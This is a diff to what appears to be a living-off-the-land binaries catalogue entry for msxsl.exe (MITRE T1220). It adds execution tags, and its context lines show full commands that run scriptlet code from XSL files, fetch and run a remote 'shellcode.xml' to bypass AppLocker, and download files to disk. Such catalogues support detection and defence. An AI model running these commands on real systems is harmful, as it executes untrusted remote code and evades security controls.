@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
+    Tags:
+      - Execute: XSL
   - Command: msxsl.exe customers.xml script.xsl
     Description: Run COM Scriptlet code within the script.xsl file (local).
     Usecase: Local execution of script stored in XSL file.
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
+    Tags:
+      - Execute: XSL
   - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
@@ -25,6 +29,9 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
+    Tags:
+      - Execute: XSL
+      - Execute: Remote
   - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
@@ -32,6 +39,9 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
+    Tags:
+      - Execute: XSL
+      - Execute: Remote
   - Command: msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>
     Description: Using remote XML and XSL files, save the transformed XML file to disk.
     Usecase: Download a file from the internet and save it to disk.
